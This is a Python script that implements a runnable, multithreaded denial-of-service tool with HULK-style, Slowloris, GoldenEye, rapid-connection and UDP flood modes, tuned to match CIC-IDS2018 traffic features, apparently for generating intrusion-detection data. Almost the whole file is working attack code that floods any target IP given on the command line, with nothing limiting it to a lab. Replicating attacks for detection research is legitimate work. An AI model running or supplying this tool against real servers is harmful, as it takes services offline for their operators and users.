"""
DoS Attack - HTTP Layer Denial of Service
Replicates CIC-IDS2018 DoS attack tool behaviors:
  - Hulk:         Rapid HTTP GET flood with randomized headers over keep-alive connections
  - Slowloris:    Hold connections open with incomplete HTTP headers (slow send)
  - GoldenEye:    HTTP GET/POST keep-alive flood with random cache-busting
  - SlowHTTPTest: Slow HTTP POST body transmission

Key: Each technique generates flows whose CICFlowMeter features differ from
     benign traffic (high pkt counts, unusual IAT, long durations, etc.).
"""

import socket
import threading
import time
import random
import string
import struct

# TCP receive buffer sizes → Init Fwd Win Byts feature.
# Values derived from CICIDS2018 training data per-class medians/distributions:
# SO_RCVBUF set BEFORE connect() controls TCP SYN window size.
# CRITICAL: Each attack type needs its training-specific value.
#
# HULK training data (n=116K, Fri-16-02-2018):
#   Init Fwd Win Byts: median=225, p5=225, p95=26883 → bimodal ~75%=225, ~25%=26883
#   The HULK tool minimizes SO_RCVBUF to conserve attacker resources.
# GoldenEye training data (n=41K, Thu-15-02-2018):
#   Init Fwd Win Byts: median=26883 → standard Linux default
# Slowloris / SlowHTTPTest: median=26883
_RCVBUF_HULK_LOW = 225          # HULK primary value (~75% of training flows)
_RCVBUF_HULK_HIGH = 26883       # HULK secondary value (~25% of training flows)
_RCVBUF_GOLDENEYE = 26883       # GoldenEye training median: 26883
_RCVBUF_SLOWLORIS = 26883       # Slowloris training: 26883
_RCVBUF_SLOWHTTPTEST = 26883    # SlowHTTPTest training: 26883

# ──────────────────────────────────────────────────────────
# Randomization pools (mimic HULK / GoldenEye header variety)
# ──────────────────────────────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/17.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/119.0.0.0 Mobile",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
]

REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.reddit.com/r/",
    "https://en.wikipedia.org/wiki/",
    "https://stackoverflow.com/questions/",
    "https://github.com/search?q=",
]

ACCEPT_TYPES = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,*/*",
    "application/json, text/javascript, */*; q=0.01",
    "image/webp,image/apng,image/*,*/*;q=0.8",
]

ACCEPT_ENCODINGS = [
    "gzip, deflate, br",
    "gzip, deflate",
    "identity",
    "br",
]


def _random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))


def _random_url_params(n=3):
    """Generate random URL query parameters for cache busting."""
    params = "&".join(f"{_random_string(5)}={_random_string(8)}" for _ in range(n))
    return f"?{params}"


class DoSAttack:
    def __init__(self, target_ip, target_port=80, duration=60):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_url = f"http://{target_ip}:{target_port}/"
        self.duration = duration
        self.running = True
        self.request_count = 0
        self.error_count = 0
        self.last_error = ""
        self.lock = threading.Lock()

    def _inc_count(self, n=1):
        with self.lock:
            self.request_count += n

    def _inc_error(self, err_msg=""):
        with self.lock:
            self.error_count += 1
            if err_msg:
                self.last_error = err_msg

    # ──────────────────────────────────────────────────────
    # HULK — Rapid TCP connection flood, mostly SYN+close
    #
    # CICIDS2018 training data (n=116K, Fri-16-02-2018):
    #   Tot Fwd Pkts:    median=2 (most flows: SYN+ACK only)
    #   TotLen Fwd Pkts: median=0 (most flows: NO payload)
    #   Tot Bwd Pkts:    median=0 (server overwhelmed, no response)
    #   Fwd Seg Size Min: 32  (TCP with timestamp options)
    #   Init Fwd Win Byts: median=225, p95=26883 (bimodal)
    #   Flow Duration:   median=7737 µs (~8ms)
    #   Dst Port: 80
    #
    # CRITICAL: The HULK tool overwhelms the server so that most
    # TCP connections never complete. ~60% of flows have 0 payload.
    # The bimodal Init Fwd Win Byts (75%=225, 25%=26883) is a key
    # distinguishing feature from benign traffic.
    # ──────────────────────────────────────────────────────
    def hulk_attack(self):
        """HULK DoS: Pure rapid TCP connect + RST close flood.

        CICIDS2018 HULK training data (n=116K, Fri-16-02-2018):
          Tot Fwd Pkts:     median=2 (SYN + retransmit/ACK)
          TotLen Fwd Pkts:  median=0 (NO HTTP payload)
          Tot Bwd Pkts:     median=0 (server overwhelmed, no response)
          Flow Duration:    median=7737 µs (~8ms)
          Init Fwd Win Byts: bimodal 75%=225, 25%=26883
          Fwd Seg Size Min: 32 (TCP with timestamps)
          Fwd Pkts/s:       median=268
          Dst Port:         80

        WHY PURE CONNECT+RST CLOSE:
        The training data shows the server was overwhelmed — most connections
        were failed/incomplete (0 payload, 0 backward packets). We can't
        fully replicate that (server always sends SYN-ACK), but we can
        MINIMIZE backward traffic by:
        1. NOT sending any HTTP data → no server response body
        2. Using SO_LINGER(1,0) → RST close instead of FIN exchange
        3. Closing immediately → minimal flow duration

        From victim's CICFlowMeter perspective:
          Fwd: [SYN, ACK, RST] = 2-3 packets, 0 payload bytes
          Bwd: [SYN-ACK] = 0-1 packets (just handshake response)

        This gives us the closest match to training data features that
        we can achieve from a single attacker machine.
        """
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

                # SO_LINGER with timeout=0: close() sends RST instead of FIN.
                # This avoids the FIN→ACK→FIN→ACK exchange, reducing both
                # forward and backward packet counts.
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER,
                                struct.pack('ii', 1, 0))

                # Bimodal SO_RCVBUF matching training distribution.
                # On Linux with ip route window=225, the route overrides this
                # but we still set it for Windows compatibility and correctness.
                if random.random() < 0.75:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_LOW)
                else:
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_HULK_HIGH)

                sock.connect((self.target_ip, self.target_port))
                self._inc_count()

                # Immediately RST close — NO data sent, NO response read.
                # This keeps TotLen Fwd Pkts = 0, minimizes backward traffic,
                # and produces the shortest possible flow duration.
                sock.close()
            except Exception as e:
                self._inc_error(str(e))

            # ~5-15ms between connections (training Flow Duration median ~8ms)
            time.sleep(random.uniform(0.005, 0.015))

    # ──────────────────────────────────────────────────────
    # SLOWLORIS — Hold connections open with incomplete headers
    #   Creates flows with LONG duration, LOW packet count,
    #   HIGH idle time, HIGH Flow IAT Mean/Max.
    # ──────────────────────────────────────────────────────
    def slowloris_attack(self):
        """Slowloris DoS: Open many sockets, send partial headers, keep alive.
        The key is to NEVER send the final \\r\\n\\r\\n so the server keeps waiting
        for the rest of the headers. Periodically send another header line to
        prevent the server from timing out the connection."""
        end_time = time.time() + self.duration
        sockets = []

        # Phase 1: Open initial batch of sockets with partial headers
        # CORRECT CICIDS2018: 50-150 connections (not 2000-5000)
        target_conns = random.randint(50, min(150, self.duration // 2))
        
        for _ in range(target_conns):
            if not self.running or time.time() >= end_time:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                sock.connect((self.target_ip, self.target_port))

                # Send INCOMPLETE HTTP request — NO final \r\n\r\n
                partial = (
                    f"GET /{_random_string(8)} HTTP/1.1\r\n"
                    f"Host: {self.target_ip}\r\n"
                    f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    f"Accept-Language: en-US,en;q=0.{random.randint(5,9)}\r\n"
                )
                sock.sendall(partial.encode())
                sockets.append(sock)
                self._inc_count()
                
                # Slight delay between opening connections
                time.sleep(random.uniform(0.01, 0.05))
            except Exception as e:
                self._inc_error(str(e))

        # Phase 2: Keep connections alive by periodically sending header lines
        while self.running and time.time() < end_time:
            alive = []
            for sock in sockets:
                try:
                    # CORRECT CICIDS2018: Send 1-2 header lines per keep-alive (SLOW!)
                    for _ in range(random.randint(1, 2)):
                        header_line = f"X-{_random_string(6)}: {_random_string(16)}\r\n"
                        sock.sendall(header_line.encode())
                        self._inc_count()
                    
                    alive.append(sock)
                except Exception as e:
                    self._inc_error(str(e))  # Server closed the connection

            sockets = alive

            # Re-open dropped connections to maintain pressure
            deficit = target_conns - len(sockets)
            for _ in range(max(0, min(20, deficit))):  # Limit re-open rate
                if not self.running or time.time() >= end_time:
                    break
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(10)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWLORIS)
                    sock.connect((self.target_ip, self.target_port))
                    partial = (
                        f"GET /{_random_string(8)} HTTP/1.1\r\n"
                        f"Host: {self.target_ip}\r\n"
                        f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                    )
                    sock.sendall(partial.encode())
                    sockets.append(sock)
                    self._inc_count()
                except Exception as e:
                    self._inc_error(str(e))

            # CORRECT CICIDS2018: 10-15 second keep-alive intervals (SLOW!)
            # This creates high Fwd IAT Mean which matches Slowloris signature
            time.sleep(random.uniform(10.0, 15.0))

        # Cleanup
        for sock in sockets:
            try:
                sock.close()
            except Exception:
                pass

    # ──────────────────────────────────────────────────────
    # GOLDENEYE — HTTP GET/POST keep-alive with slow pacing
    #
    # CICIDS2018 training data (n=41.5K, Thu-15-02-2018):
    #   Tot Fwd Pkts:    median=4 (multiple requests per connection)
    #   TotLen Fwd Pkts: median=353
    #   Tot Bwd Pkts:    median=3
    #   Fwd Seg Size Min: 32
    #   Init Fwd Win Byts: median=26883
    #   Flow Duration:   median=6,767,520 µs (~6.8 sec) LONG!
    #   Flow IAT Mean:   median=1,623,069 µs (~1.6 sec)
    #   Fwd Pkts/s:      median=0.7 (very slow)
    #   Dst Port: 80
    #
    # CRITICAL: GoldenEye holds keep-alive connections open and
    # sends 2-4 requests spaced ~1.6 seconds apart. This is the
    # OPPOSITE of HULK's rapid connect/disconnect pattern.
    # ──────────────────────────────────────────────────────
    def goldeneye_attack(self):
        """GoldenEye DoS: HTTP GET/POST keep-alive flood with slow request pacing.
        
        CICIDS2018 GoldenEye training data (n=41.5K, Thu-15-02-2018):
          Tot Fwd Pkts:     median=4 (multiple requests per connection)
          TotLen Fwd Pkts:  median=353
          Tot Bwd Pkts:     median=3
          Flow Duration:    median=6,767,520 µs (~6.8 sec)  LONG connections!
          Flow IAT Mean:    median=1,623,069 µs (~1.6 sec)
          Fwd Pkts/s:       median=0.7 (very slow)
          PSH Flag Cnt:     median=1
          Fwd Pkt Len Mean: median=80.5
          Bwd Pkt Len Mean: median=220.7
          Init Fwd Win Byts: median=26883
        
        The GoldenEye tool holds keep-alive connections open and sends
        2-4 GET/POST requests spaced ~1.6 seconds apart. Each connection
        lasts ~6-8 seconds total. This is VERY different from HULK's
        rapid connect/disconnect pattern.
        """
        end_time = time.time() + self.duration
        
        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_GOLDENEYE)
                
                sock.connect((self.target_ip, self.target_port))

                # Send 2-4 requests per keep-alive connection (matching training median=4 fwd pkts)
                num_reqs = random.randint(2, 4)
                
                for req_idx in range(num_reqs):
                    if not self.running or time.time() >= end_time:
                        break

                    if random.random() < 0.6:
                        # GET with cache busting (~80-120 bytes to match Fwd Pkt Len Mean=80.5)
                        path = "/" + _random_string(random.randint(4, 10)) + _random_url_params(random.randint(2, 6))
                        req = (
                            f"GET {path} HTTP/1.1\r\n"
                            f"Host: {self.target_ip}:{self.target_port}\r\n"
                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                            f"Accept: {random.choice(ACCEPT_TYPES)}\r\n"
                            f"Referer: {random.choice(REFERERS)}{_random_string(random.randint(4, 8))}\r\n"
                            f"Cache-Control: no-store, no-cache\r\n"
                            f"Pragma: no-cache\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                        )
                    else:
                        # POST with small body (~50-150 bytes)
                        body_size = random.randint(50, 150)
                        body = _random_string(body_size)
                        path = "/" + _random_string(random.randint(4, 8))
                        req = (
                            f"POST {path} HTTP/1.1\r\n"
                            f"Host: {self.target_ip}:{self.target_port}\r\n"
                            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Content-Length: {len(body)}\r\n"
                            f"Connection: keep-alive\r\n"
                            f"\r\n"
                            f"{body}"
                        )
                    
                    sock.sendall(req.encode())
                    self._inc_count()

                    # Read server response (creates bidirectional traffic)
                    try:
                        sock.settimeout(2)
                        sock.recv(4096)
                    except socket.timeout:
                        pass
                    sock.settimeout(10)

                    # Wait 1-2 seconds between requests (matching Flow IAT Mean ~1.6 sec)
                    if req_idx < num_reqs - 1:
                        time.sleep(random.uniform(1.0, 2.0))

                # Close after all requests
                sock.close()
            except Exception as e:
                self._inc_error(str(e))

            # Brief pause between connections (0.1-0.3s)
            time.sleep(random.uniform(0.1, 0.3))

    # ──────────────────────────────────────────────────────
    # SlowHTTPTest — Rapid TCP connection flood
    #
    #   CICIDS2018 training data (n=91K, Fri-16-02-2018):
    #     Tot Fwd Pkts:  median=1 (SYN only)
    #     Tot Bwd Pkts:  median=1 (SYN-ACK only)
    #     TotLen Fwd Pkts: median=0 (no payload)
    #     Flow Duration: median=3 µs (microseconds!)
    #     Fwd Pkts/s:    median=333,333
    #     Flow Pkts/s:   median=666,667
    #     Down/Up Ratio: median=1
    #     PSH Flag Cnt:  median=1
    #     Dst Port:      21 (originally targeted FTP)
    #
    #   The training data shows SlowHTTPTest generated massive floods
    #   of micro-connections (SYN+close) that overwhelmed the target.
    #   NOT slow POST body dripping as the name suggests.
    # ──────────────────────────────────────────────────────
    def slowhttp_attack(self):
        """SlowHTTPTest DoS: Rapid TCP connection flood.
        Creates massive numbers of micro-connections (connect+close)
        matching the CICIDS2018 training data profile of 1 fwd pkt,
        1 bwd pkt, 0 payload, ~3µs per flow."""
        end_time = time.time() + self.duration

        while self.running and time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, _RCVBUF_SLOWHTTPTEST)
                sock.connect((self.target_ip, self.target_port))
                self._inc_count()
                
                # Immediately close — training shows 0 payload, ~3µs flows
                sock.close()
            except Exception as e:
                self._inc_error(str(e))

            # Minimal delay — training shows 333K+ fwd pkts/sec
            time.sleep(random.uniform(0.001, 0.005))

    # ──────────────────────────────────────────────────────
    # UDP FLOOD — Protocol diversity (not just TCP)
    #   FIXED: Reuse socket for multiple packets (fewer flows = realistic)
    #   Send 2-3 packets per flow, then rotate to new destination port/size
    #   Target: 3-5 flows/sec (not 100+)
    # ──────────────────────────────────────────────────────
    def udp_flood(self):
        """UDP Flood: Send bursts of UDP packets to target port.
        Creates fewer, more realistic flows. ~3-5 flows/sec.
        FIXED: Use target_port as primary to match training data."""
        end_time = time.time() + self.duration
        
        while self.running and time.time() < end_time:
            try:
                # Create ONE socket for a burst
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(3)
                
                # FIXED: Use target_port as primary destination
                attack_port = self.target_port
                payload_size = random.randint(64, 512)
                payload = _random_string(payload_size)
                
                # Send 2-3 packets per burst (same flow)
                burst_packets = random.randint(2, 3)
                for _ in range(burst_packets):
                    sock.sendto(payload.encode(), (self.target_ip, attack_port))
                    self._inc_count()
                
                sock.close()
                
            except Exception as e:
                self._inc_error(str(e))
            
            # Sleep 0.3-0.5 sec between bursts
            time.sleep(random.uniform(0.3, 0.5))

    def run_attack(self, num_threads=10, techniques=None):
        """Run DoS attack with multiple threads.

        Args:
            num_threads: Number of attack threads
            techniques: List of technique names, one per thread.
                If None, all threads run 'hulk'.
                Valid: 'hulk', 'goldeneye', 'slowloris', 'slowhttp', 'udp'
                List is extended/trimmed to match num_threads.

        Each technique generates a distinct CICFlowMeter flow profile:
          hulk:      Rapid TCP connect+RST close (window=225, 0 payload)
          goldeneye: HTTP keep-alive with slow pacing (window=26883, ~6.8s flows)
          slowloris: Incomplete headers held open (window=26883, long duration)
          slowhttp:  Rapid TCP connect+close (window=26883, micro-flows)
          udp:       UDP packet bursts (protocol diversity)
        """
        technique_map = {
            'hulk': self.hulk_attack,
            'goldeneye': self.goldeneye_attack,
            'slowloris': self.slowloris_attack,
            'slowhttp': self.slowhttp_attack,
            'udp': self.udp_flood,
        }

        if techniques is None:
            techniques = ['hulk'] * num_threads

        # Extend or trim to match num_threads
        while len(techniques) < num_threads:
            techniques.append(techniques[-1])
        techniques = techniques[:num_threads]

        # Display technique summary
        from collections import Counter
        tech_counts = Counter(techniques)
        tech_str = " + ".join(f"{name.upper()}({cnt}T)" for name, cnt in tech_counts.items())

        print(f"[DoS] Starting on {self.target_ip}:{self.target_port} for {self.duration}s")
        print(f"[DoS] Techniques: {tech_str}")

        threads = []
        for i in range(num_threads):
            tech_name = techniques[i]
            tech_func = technique_map.get(tech_name, self.hulk_attack)
            t = threading.Thread(target=tech_func, name=f"DoS-{tech_name}-{i}")
            t.daemon = True
            t.start()
            threads.append(t)

        # Progress reporting while threads run
        start_time = time.time()
        report_interval = 10  # seconds
        next_report = start_time + report_interval

        while True:
            # Check if all threads finished
            alive = [t for t in threads if t.is_alive()]
            if not alive:
                break

            now = time.time()
            elapsed = now - start_time

            # Periodic progress report
            if now >= next_report:
                with self.lock:
                    reqs = self.request_count
                    errs = self.error_count
                    last_err = self.last_error
                print(f"[DoS] {elapsed:.0f}s elapsed | {reqs} connections | {errs} errors | {len(alive)} threads alive")
                if errs > 0 and last_err:
                    print(f"[DoS]   Last error: {last_err}")
                next_report = now + report_interval

            # Don't spin-wait
            time.sleep(1)

        self.running = False
        elapsed = time.time() - start_time
        print(f"[DoS] Attack completed in {elapsed:.2f}s — {self.request_count} connections, {self.error_count} errors")
        if self.error_count > 0:
            print(f"[DoS] Last error was: {self.last_error}")
        if self.request_count == 0 and self.error_count > 0:
            print(f"[DoS] WARNING: Zero successful connections! Check target connectivity.")


def run_dos(target_ip, target_port=80, duration=60, threads=5, techniques=None):
    """Run DoS attack with specified techniques.

    Args:
        techniques: List of technique names per thread (see run_attack).
            If None, all threads run 'hulk'.

    Returns:
        (total_connections, total_errors) tuple.
    """
    attack = DoSAttack(target_ip, target_port, duration)
    attack.run_attack(num_threads=threads, techniques=techniques)
    return attack.request_count, attack.error_count


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        target_ip = sys.argv[1]
        duration = int(sys.argv[2]) if len(sys.argv) > 2 else 60
        run_dos(target_ip, duration=duration)
    else:
        print("Usage: python _1_dos_attack.py <target_ip> [duration]")
